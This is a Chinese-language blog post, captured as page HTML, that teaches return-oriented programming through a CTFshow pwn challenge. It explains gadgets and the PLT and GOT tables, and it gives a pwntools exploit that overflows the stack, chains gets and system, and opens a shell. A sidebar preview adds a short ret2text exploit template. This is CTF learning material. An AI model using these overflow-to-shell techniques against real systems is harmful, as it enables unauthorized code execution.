@@ -1,0 +1,245 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>初识 | JiuTian's blog</title><meta name="author" content="JiuTian521"><meta name="copyright" content="JiuTian521"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="如果遇到NX保护，即栈堆不可执行的情况，我们shellcode将不能作为机器码被执行，那么我们就需要新的方法————ROP技术。 何为ROP？ROP的全称为返回导向编程。听名字十分牛的样子。ROP的核心在返回，即ret上。ret等价于pop EIP&#x2F;RIP，call所调用的函数结束后，ret会把返回地址弹出栈，程序会跳到ret指向的地址。  出自《深入理解计算机系统（CSAPP）》第三章">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初识">
+<meta property="og:url" content="https://jiutian521.github.io/posts/b342ee93.html">
+<meta property="og:site_name" content="JiuTian&#39;s blog">
+<meta property="og:description" content="如果遇到NX保护，即栈堆不可执行的情况，我们shellcode将不能作为机器码被执行，那么我们就需要新的方法————ROP技术。 何为ROP？ROP的全称为返回导向编程。听名字十分牛的样子。ROP的核心在返回，即ret上。ret等价于pop EIP&#x2F;RIP，call所调用的函数结束后，ret会把返回地址弹出栈，程序会跳到ret指向的地址。  出自《深入理解计算机系统（CSAPP）》第三章">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jiutian521.github.io/img/%E9%98%B3%E8%8F%9C%E5%A4%B4%E5%83%8F%E6%AD%A3%E6%96%B9%E5%BD%A2.jpg">
+<meta property="article:published_time" content="2025-11-01T04:00:00.000Z">
+<meta property="article:modified_time" content="2025-11-05T13:57:28.664Z">
+<meta property="article:author" content="JiuTian521">
+<meta property="article:tag" content="九天,JiuTian,jiutian,JiuTian521,jiutian521,九天天">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jiutian521.github.io/img/%E9%98%B3%E8%8F%9C%E5%A4%B4%E5%83%8F%E6%AD%A3%E6%96%B9%E5%BD%A2.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "初识",
+  "url": "https://jiutian521.github.io/posts/b342ee93.html",
+  "image": "https://jiutian521.github.io/img/%E9%98%B3%E8%8F%9C%E5%A4%B4%E5%83%8F%E6%AD%A3%E6%96%B9%E5%BD%A2.jpg",
+  "datePublished": "2025-11-01T04:00:00.000Z",
+  "dateModified": "2025-11-05T13:57:28.664Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "JiuTian521",
+      "url": "https://JiuTian521.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://jiutian521.github.io/posts/b342ee93.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="manifest" href="/null"/><link rel="icon" type="image/png" sizes="32x32" href="/image/32x32.ico"/><link rel="icon" type="image/png" sizes="16x16" href="/image/16x16.ico"/><link rel="stylesheet" href="/css/index.css?v=5.5.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"pagination":{"enable":true,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-right"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '初识',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 8.1.1"><link rel="alternate" href="/atom.xml" title="JiuTian's blog" type="application/atom+xml">
+</head><body><div id="web_bg" style="background-image: url(https://youke1.picui.cn/s1/2025/11/02/6906ff8dd29fe.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/%E9%98%B3%E8%8F%9C%E5%A4%B4%E5%83%8F%E6%AD%A3%E6%96%B9%E5%BD%A2.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">JiuTian's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">初识</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">初识</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-01T04:00:00.000Z" title="发表于 2025-11-01 12:00:00">2025-11-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-05T13:57:28.664Z" title="更新于 2025-11-05 21:57:28">2025-11-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>如果遇到NX保护，即栈堆不可执行的情况，我们shellcode将不能作为机器码被执行，那么我们就需要新的方法————ROP技术。</p>
+<p>何为ROP？ROP的全称为返回导向编程。听名字十分牛的样子。ROP的核心在返回，即ret上。ret等价于pop EIP&#x2F;RIP，call所调用的函数结束后，ret会把返回地址弹出栈，程序会跳到ret指向的地址。</p>
+<p><img src="https://youke1.picui.cn/s1/2025/11/05/690b5571a395c.png" alt="Snipaste_2025-11-05_21-47-57.png" loading='lazy'></p>
+<p>出自《深入理解计算机系统（CSAPP）》第三章,要注意的一个问题是，国内外的计算机教材对于栈的画法是相反的，国外的教材更倾向于把栈倒过来画，即栈顶sp在下，栈底bp在上，栈向下增长（向下画）。不过并不影响实际的理解。</p>
+<p>接下来我们需要知道什么是gadget。gadget在英语里的翻译是小玩意，小装置的意思，在二进制领域，gadget就是一小段程序里已经有的，通常以ret结尾的汇编代码，注意这里的关键词，“一小段”，“已有的”，“以ret结尾的”，重点是后两个词，这就意味着我们可以通过一段又一段的gadget不断ret到程序内的不同地方。就算开了NX不让我们执行shellcode，但是程序里已经有的指令总不能不让我们执行吧，这就是gadget的用处。</p>
+<p>所以ROP就是一项通过构造一系列的gadget实现攻击的技术。</p>
+<p>再讲一下got表和plt表是什么，这一块牵扯到静态链接和动态链接，以及延迟绑定相关的内容。延迟绑定我还没有做到涉及的题目，所以暂时按下不表。</p>
+<p>静态链接就是把程序要用的函数，代码等直接写进了可执行文件里，在编译时加载，缺点就是文件的大小会比较大。动态链接会在程序启动时从动态链接库里调用函数，比如libc库。</p>
+<p>PLT表（Procedure Linkage Table，过程链接表），用于支持动态链接函数调用（例如 printf, puts, system等），相当于调用外部函数时的跳板。GOT表 （Global Offset Table全局偏移表）是在运行时保存动态库函数或全局变量实际地址的表。plt表经过一段复杂的过程后，会跳转并链接到got表，这里是存储函数的真实地址，动态链接器负责把libc的地址写进got表，got表会跳转到存放函数的真实地址。</p>
+<p>接下来我以CTFshow的pwn入门43题讲解一下ROP的使用</p>
+<p><img src="https://youke1.picui.cn/s1/2025/11/05/690b55c3c7f30.png" alt="Snipaste_2025-11-05_21-49-22.png" loading='lazy'></p>
+<p>这种情况下我们需要想办法自己构造出一个bin&#x2F;sh出来，我们首先需要知道程序的哪个地方存在可读可写的段。我们gdb程序，在main函数下断点并运行，使用vmmap指令</p>
+<p><img src="https://youke1.picui.cn/s1/2025/11/05/690b560fedca7.png" alt="Snipaste_2025-11-05_21-50-32.png" loading='lazy'></p>
+<p>果然.bss段里有一个buf2的变量，我们可以把bin&#x2F;sh写进去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28119)</span><br><span class="line">io = process(&quot;./pwn43&quot;)</span><br><span class="line">gdb.attach(io,&#x27;&#x27;&#x27;break *0x08048420</span><br><span class="line">           break *0x08048450&#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">buf2 = 0x0804B060</span><br><span class="line">system = 0x08048450</span><br><span class="line">gets = 0x08048420</span><br><span class="line">payload= b&#x27;A&#x27;*(0x6c+0x4)</span><br><span class="line">payload += p32(gets)</span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(buf2)</span><br><span class="line">payload += p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(b&quot;/bin/sh&quot;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>来解释一下这段exp：第一步栈溢出，覆盖到EIP处，把EIP指向的返回地址改到gets处，再将gets的返回地址改为system，在调用完gets函数后，会弹出ret指令，ret到system的位置，第一个buf2作为gets的参数，我们的目的是通过gets将bin&#x2F;sh字符写入buf2，（io.sendline(b”&#x2F;bin&#x2F;sh”)就是把bin&#x2F;sh字符串通过gets函数读入buf里），而第二个buf2作为system的一参被调用，最后成功执行system bin&#x2F;sh获得shell</p>
+<p>我们用gdb调试一下，验证这段exp是否正确。</p>
+<p>我们在exp里，在gets函数和system函数处分别下一个断点，运行exp进入gdb调试界面，按c走到第一个断点之前</p>
+<p><img src="https://youke1.picui.cn/s1/2025/11/05/690b5668a58ff.png" alt="Snipaste_2025-11-05_21-52-00.png" loading='lazy'></p>
+<p>这里的backtrace窗口简称bt窗口，可以显示当前程序的调用栈，即call stack，每一行都是一个栈帧，可以帮我们看函数调用的顺序</p>
+<p>我们可以看的非常清楚，我们的ebp已经被aaaa覆盖，eip被改到了gets函数处，esp栈顶被改到了system处，在栈窗口，system下方是我们覆盖的两个buf2</p>
+<p><img src="https://youke1.picui.cn/s1/2025/11/05/690b56db7d3d8.png" alt="Snipaste_2025-11-05_21-53-44.png" loading='lazy'></p>
+<p>我们继续按c，执行完gets函数，到system断点前，x&#x2F;s查看一下buf的内存，可以看到bin&#x2F;sh已经被成功写到buf2里了</p>
+<p><img src="https://youke1.picui.cn/s1/2025/11/05/690b572e8e9ad.png" alt="Snipaste_2025-11-05_21-55-25.png" loading='lazy'></p>
+<p>总结一下，本题属于典型的有system无bin&#x2F;sh或sh代替，需要我们自己在一段可读可写的内存里写入bin&#x2F;sh字符串，是非常经典的一道基本ret2libc题目，让我们初步认识了ROP的原理以及是如何构造的，如何找到可读可写的内存，plt表和got表是什么，动态链接和静态链接的过程分别是怎么样的，32位系统是如何通过栈传参的，栈是如何增长的，call和ret指令的本质是怎样的等</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://JiuTian521.github.io">JiuTian521</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://jiutian521.github.io/posts/b342ee93.html">https://jiutian521.github.io/posts/b342ee93.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://JiuTian521.github.io" target="_blank">JiuTian's blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/%E9%98%B3%E8%8F%9C%E5%A4%B4%E5%83%8F%E6%AD%A3%E6%96%B9%E5%BD%A2.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/1234.html" title="梦开始的地方"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">梦开始的地方</div></div><div class="info-2"><div class="info-item-1">我的博客搭建终于好了！ 从今天起，我会在我的博客上分享我的wp，以及一些CTF的日常，希望和大家一起多多交流！ </div></div></div></a><a class="pagination-related" href="/posts/1111.html" title="ret2text小tips"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">ret2text小tips</div></div><div class="info-2"><div class="info-item-1">exp模板 12345678910from pwn import *io = remote(&quot;39.106.48.123&quot;, 29826)payload = b&quot;A&quot;*264 + p64(0x401202)io.sendline(payload)io.interactive()  264即258+8，258是rbp的位置，ida里一般是16位，0x401202为后门函数入栈的地址 注意：1.一定不要忘记加4&#x2F;8个字节覆盖栈底寄存器 2.在64位程序中，如果不成功，可能是栈没有对齐，需要把后门函数的地址往后加两个单位 </div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/%E9%98%B3%E8%8F%9C%E5%A4%B4%E5%83%8F%E6%AD%A3%E6%96%B9%E5%BD%A2.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="author-info-name">JiuTian521</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/JiuTian521"><i class="fab fa-github"></i><span>不知名小pwn手</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/JiuTian521" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">每一个不曾起舞的日子，都是对生命的辜负</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/2ee84d32.html" title="用gdb的动态视角看ret2text的实现">用gdb的动态视角看ret2text的实现</a><time datetime="2025-11-05T13:21:00.000Z" title="发表于 2025-11-05 21:21:00">2025-11-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/d4f00467.html" title="写源代码一定要crtl+s保存啊啊啊啊啊">写源代码一定要crtl+s保存啊啊啊啊啊</a><time datetime="2025-11-05T04:00:00.000Z" title="发表于 2025-11-05 12:00:00">2025-11-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/1234.html" title="梦开始的地方">梦开始的地方</a><time datetime="2025-11-02T10:00:00.000Z" title="发表于 2025-11-02 18:00:00">2025-11-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/b342ee93.html" title="初识">初识</a><time datetime="2025-11-01T04:00:00.000Z" title="发表于 2025-11-01 12:00:00">2025-11-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/1111.html" title="ret2text小tips">ret2text小tips</a><time datetime="2025-10-24T04:00:00.000Z" title="发表于 2025-10-24 12:00:00">2025-10-24</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By JiuTian521</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.1"></script><script src="/js/main.js?v=5.5.1"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.1"></script></div></div><!-- hexo injector body_end start --><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '30');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('article-sort-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__slideInRight');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow_init.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>
